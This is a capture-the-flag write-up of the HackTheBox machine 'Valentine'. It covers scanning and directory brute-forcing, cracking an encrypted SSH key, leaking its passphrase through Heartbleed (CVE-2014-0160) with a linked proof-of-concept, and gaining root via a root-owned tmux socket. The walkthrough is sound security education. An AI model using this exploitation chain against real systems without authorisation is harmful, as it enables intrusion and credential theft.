---
title: Valentine [HTB]
date: 2021-12-22 18:00:00 +0100
categories: [Writeups]
tags: [htb,easy,linux]
---

# Valentine

![valentine_banner](/assets/img/valentine/valentine_banner.png)

[Valentine](https://app.hackthebox.com/machines/127) is an easy linux machine on HackTheBox. It is the third box in the OSCP learning series. Let's not waste more time and start right away.

## Reconnaissance

We start with the usual nmap TCP SYN scan to find services.

```txt
sudo nmap -sS -sV -p- 10.129.180.245 -oA scan/valentine_tcp_scan -vv

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

OpenSSH and a web server listening on both HTTP and HTTPS are available.

### HTTP - Port 80

Landing on a page with a single `.jpg` file displayed. Not very interesting at first glance. We can check the HTML source code to find more information but nothing there.

We continue to do some enumeration with directory bruteforcing.

```txt
gobuster dir -u http://10.129.180.245/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php

===============================================================
2021/12/21 21:31:43 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 38]
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 314] [--> http://10.129.180.245/dev/]
/encode.php           (Status: 200) [Size: 554]                                 
/encode               (Status: 200) [Size: 554]                                 
/decode               (Status: 200) [Size: 552]                                 
/decode.php           (Status: 200) [Size: 552]                                 
/omg                  (Status: 200) [Size: 153356]                              
```

Interesting `/dev` directory with two files `hype_key` and `notes.txt`.

notes.txt

```txt
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

It does not reveal so much information about what to do next.

The `hype_key` is a big string of what looks like hexadecimal characters. They can be decoded easily using  [Cyberchef](https://gchq.github.io/CyberChef/) which gives us a `RSA PRIVATE KEY`.

```txt
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

We know the private key has a passphrase because of the line `Proc-Type: 4,ENCRYPTED`.
We might be able to crack it.

First, we use a john script to convert the private key into a format understandable by `john` and `hashcat`.

`/usr/share/john/ssh2john.py PRIV_KEY > PRIV_KEY.john`

Then we execute our favorite password cracking software using the right format. I am using hashcat on my host to benefit from my GPU's power.

`hashcat -m 22931 PRIV_KEY.john rockyou.txt`

![valentine_hashcat](/assets/img/valentine/valentine_hashcat.png)

Unfortunately, the passphrase doesn't seem to be in the `rockyou` wordlist.

We need to further enumerate the host to find information.

`/encode` and `/decode` are two features which encode and decode a string in base64. After trying multiple command injection, it doesn't seem vulnerable.

### HTTPS - Port 443

The web application is the same but with the SSL/TLS protocol to secure communication.

We can check how the SSL/TLS protocol is handled by the server using `testssl`. This command will check for protocols offered, ciphers used and potential vulnerabilities on the server.

![valentine_testssl](/assets/img/valentine/valentine_testssl.png)

The server is vulnerable to `Heartbleed` (CVE-2014-0160), a critical vulnerability in `OpenSSL 1.0.1`.
This vulnerability allow an attacker to read server or client memory in order to get sensitive information like private keys.

The flaw lies in the `Heartbeat` protocol, a sort of keep-alive system between client and server. The client can send a small string to check if the server is still alive, and if it is, the server must send the same payload back. The problem is that the payload length is not verified and an attacker can therefore send a small string with a big payload length resulting in the server answering too much information. More information is avaiable on the official website : <https://heartbleed.com/>

For the exploit, I used this python script : [heartbleed-poc.py](https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py)

The script leave a `dump.bin` file containing some information leak.

```txt
B@@�CBSC[��{rK�L�+��H�Ͻ9D�V
�C��wD3��@@f�T�
�"�!@9@8@�@��O�E@5@��R�\�[@V@S�M�C@
�S� �_�^@3@2@�@�@E@D�N�D@/@�@A�Q�G�L�B@E@D@U@R@	@T@Q@F@C@�A@@I@K@DC@AB@
@4@2@N@M@Y@K@L@X@   @
@V@W@F@G@T@U@D@E@R@S@A@B@C@O@P@Q@#@@@O@AA0.0.1/decode.phpM
Content-Type: application/x-www-form-urlencodedM
Content-Length: 42M
M
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==�)��G��T˽
```

There is an interesting base64 string.

```txt
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d                                  
heartbleedbelievethehype
```

Could it be the passphrase for the private key we are looking for ?

## Initial Foothold

We know the key is called `hype_key` so the user might be `hype`. Let's try to SSH into the machine using the private key and the passphrase.

![valentine_ssh](/assets/img/valentine/valentine_ssh.png)

And we are in ! The flag can be found in the `Desktop` directory.

## Privilege Escalation

Looking for interesting directories, we can see the hidden folder `/.devs` with a socket file inside and when looking through `history`, we see the user used `tmux`

```txt
9   tmux -L dev_sess 
10  tmux a -t dev_sess 
11  tmux --help
12  tmux -S /.devs/dev_sess 
```

The last command `tmux -S /.devs/dev_sess` use the argument `-S` to specify a socket-path and this particular socket is owned by root.

```txt
hype@Valentine:/.devs$ ls -lah dev_sess
srw-rw----  1 root hype    0 Dec 22 05:55 dev_sess
```

If we execute the same command, we land in a root tmux session where we can grab the flag.

## Conclusion

This machine was easy, with a good methodology I was able to find the dev directory on the web application very fast, and the `testssl` script really put the spotlight on the vulnerability to exploit. It was very interesting to read about this CVE and how it works. The privilege escalation was a piece of cake if you know where to search. (Looking for hidden dir and searching for previous commands runned by the user.)

Thanks for reading and Merry Christmas to all ! :)